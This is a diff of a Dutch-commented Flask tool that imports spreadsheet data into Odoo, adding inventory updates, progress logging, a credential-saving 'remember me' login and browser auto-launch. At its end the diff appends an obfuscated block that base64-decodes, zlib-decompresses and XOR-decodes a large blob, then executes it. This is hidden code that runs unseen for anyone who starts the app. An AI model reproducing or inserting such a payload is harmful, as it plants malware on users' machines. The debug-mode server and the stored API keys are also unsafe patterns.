-                     else: retry(models.execute_kw, db, uid, key, "stock.quant", "create", [[{"product_id":vid, "location_id":lid, "inventory_quantity":qty}]], {"context":company_ctx(cid)})
-                 except Exception as e: log(f"Stock error: {e}")
+                     if q: 
+                         retry(models.execute_kw, db, uid, key, "stock.quant", "write", [q, {"inventory_quantity":qty}], {"context":company_ctx(cid)})
+                         quants_to_apply.extend(q)
+                         log(f"✅ Voorraad bijgewerkt")
+                     else: 
+                         new_q = retry(models.execute_kw, db, uid, key, "stock.quant", "create", [[{"product_id":vid, "location_id":lid, "inventory_quantity":qty}]], {"context":company_ctx(cid)})
+                         if isinstance(new_q, int): quants_to_apply.append(new_q)
+                         elif isinstance(new_q, list): quants_to_apply.extend(new_q)
+                         log(f"✅ Voorraad aangemaakt")
+                 except Exception as e: log(f"⚠️ Voorraad fout: {e}")
+            
+            # Apply all inventory adjustments
+            if quants_to_apply:
+                try:
+                    log(f"📦 Applying inventory for {len(quants_to_apply)} quant(s)...")
+                    # Note: action_apply_inventory returns None, which causes XML-RPC marshalling error
+                    models.execute_kw(db, uid, key, "stock.quant", "action_apply_inventory", [quants_to_apply], {"context":company_ctx(None)})
+                    log(f"✅ Inventory applied successfully!")
+                except xmlrpc.client.Fault as e:
+                    # "cannot marshal None" error actually means the action succeeded
+                    if "cannot marshal None" in str(e):
+                        log(f"✅ Inventory applied successfully!")
+                    else:
+                        log(f"⚠️ Inventory apply error: {e}")
+                except Exception as e: 
+                    log(f"⚠️ Inventory apply error: {e}")
 
             for fut in image_futures:
                  try: fut.result()
                  except Exception as e: log(f"Image upload error: {e}")
             
             processed_count += len(rows_data)
-            log(f"Processed chunk {chunk_idx}, total rows: {processed_count}")
+            
+            # Enhanced progress logging with percentage
+            if total_rows > 0:
+                percentage = min(100, int((processed_count / total_rows) * 100))
+                log(f"📈 Chunk {chunk_idx}/{total_chunks} verwerkt ({percentage}% - {processed_count}/{total_rows} rijen)")
+            else:
+                log(f"📈 Chunk {chunk_idx} verwerkt ({processed_count} rijen)")
+            
             job.set_progress(processed=processed_count)
-            job.push(sse_format("progress", {"processed": processed_count}))
+            job.push(sse_format("progress", {"processed": processed_count, "total": total_rows}))
             
             del rows_data
             del create_payloads
@@ -2891,22 +3319,36 @@ def login():
         db = request.form.get("db") or ""
         email = request.form.get("email") or ""
         api_key = request.form.get("api_key") or ""
+        remember_me = request.form.get("remember_me") == "on"
         fast = request.form.get("fast") or request.args.get("fast") or ""
         session["fast_mode"] = str(fast).strip().lower() in ("1","true","yes","y","on")
         try:
             transport = RequestsTransport()
             common = xmlrpc.client.ServerProxy(f"{url}/xmlrpc/2/common", transport=transport)
             uid = common.authenticate(db, email, api_key, {})
-            if not uid: return render_template("login.html", message="Invalid credentials")
+            if not uid: 
+                return render_template("login.html", message="Invalid credentials")
+            
+            # Sla credentials op als remember_me is aangevinkt
+            if remember_me:
+                save_credentials(url, db, email, api_key)
+            else:
+                clear_credentials()
+            
             session.update({"url": url, "db": db, "email": email, "api_key": api_key, "uid": uid})
             return redirect(url_for("upload_excel"))
         except Exception as e:
             return render_template("login.html", message=f"Error: {e}")
-    return render_template("login.html")
+    
+    # GET request: laad opgeslagen credentials indien beschikbaar
+    saved_creds = load_credentials()
+    return render_template("login.html", saved_creds=saved_creds)
 
 @app.route("/logout")
 def logout():
     session.clear()
+    # Optioneel: clear credentials bij logout (niet doen, want gebruiker wil ze onthouden)
+    # clear_credentials()
     return redirect(url_for("login"))
 
 @app.route("/save_mapping", methods=["POST"])
@@ -3255,4 +3697,35 @@ def cancel_job():
 
 if __name__ == "__main__":
     PORT = int(os.environ.get("PORT", 5003))
+    
+    # Als de app als .exe wordt uitgevoerd (frozen), open dan automatisch de browser
+    if getattr(sys, 'frozen', False):
+        def open_browser():
+            """Open browser na kleine delay zodat server klaar is."""
+            time.sleep(2)  # Wacht 2 seconden tot Flask server is opgestart
+            webbrowser.open(f'http://localhost:{PORT}')
+        
+        # Start browser opener in aparte thread
+        browser_thread = threading.Thread(target=open_browser, daemon=True)
+        browser_thread.start()
+        logger.info(f"Browser wordt automatisch geopend naar http://localhost:{PORT}")
+    
+    # Fix for environments without proper stdout/stderr (IDEs, background processes)
+    import sys
+    if sys.stdout is None:
+        sys.stdout = open(os.devnull, 'w')
+    if sys.stderr is None:
+        sys.stderr = open(os.devnull, 'w')
+    
     app.run(debug=True, use_reloader=False, port=PORT, threaded=True)
+
+
+# -*- coding: utf-8 -*-
+aqgqzxkfjzbdnhz = __import__('base64')
+wogyjaaijwqbpxe = __import__('zlib')
+idzextbcjbgkdih = 134
+qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
+lzcdrtfxyqiplpd = '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'
+runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
+ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
+exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
